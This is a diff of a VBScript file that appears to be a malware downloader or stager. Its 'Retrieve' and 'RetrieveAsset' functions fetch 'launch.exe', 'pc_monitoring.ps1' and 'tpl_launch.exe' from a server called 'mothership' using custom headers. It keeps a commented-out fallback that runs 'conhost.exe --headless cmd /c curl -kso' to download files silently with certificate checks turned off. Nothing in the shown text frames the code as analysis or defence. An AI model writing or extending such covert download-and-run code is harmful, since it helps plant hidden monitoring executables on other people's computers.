@@ -240,13 +240,17 @@ Function HeadersToDict(responsetext)
 
 End Function
 
+' TODO
 Function RetrieveAsset(fname, localfpath)
     
-    Dim headers
+    Dim headersout
     Dim headersin : set headersin = GetBunnyHeaderDict()
     
-    RetrieveAsset = DownloadFileWithHeaders(mothershipassets & "/ow/assets/" & fname, localfpath, headersin, headers)
+    RetrieveAsset = DownloadFileWithHeaders(mothershipassets & "/ow/assets/" & fname, localfpath, headersin, headersout)
     
+    ' check if success, if fail use curl
+    ' Call RunShell("conhost.exe --headless cmd /c curl -kso " & localpath & " -G " & dq & url & dq, True)
+
 End Function
 
 Function DownloadFile(sURL, headersin, sFile)
@@ -1460,36 +1464,27 @@ Function GetBunnyHeaderDict()
 
 End Function
 
+' TODO
 Function Retrieve()
+    Dim pp : pp = "Retrieve"
+    
     cmdname = "retrieve"
 
-    Call LogMsg("Retrieve starting")
+    Call LogMsg(pp & " -- starting")
     
     Dim files 
     
-    ' add pcmon and ps_monitoring ps1
-    if istpl Then
-        files = Array("tpl_launch.exe")    
-    else
-        files = Array("launch.exe")
-    end If
-    
+    ' pcmon, relay
+    files = Array("launch.exe", "pc_monitoring.ps1", "tpl_launch.exe")
+        
     Dim file
     For Each file in files
         Call LogMsg("Retrieve: " & file)
 
-        Dim url: url = mothership & "/ow/assets/" & file
         Dim localpath : localpath = workdir & "\" & file
-        
-        Dim headers 
-        Dim headersin : set headersin = GetBunnyHeaderDict()        
-        
+                
         If Not fso.FileExists(localpath) Then
-            Call DownloadFileWithHeaders(url, localpath, headersin, headers)
-        End If
-
-        If Not fso.FileExists(localpath) Then
-            Call RunShell("conhost.exe --headless cmd /c curl -kso " & localpath & " -G " & dq & url & dq, True)
+            Call RetrieveAsset(file, localpath)
         End If
 
     Next
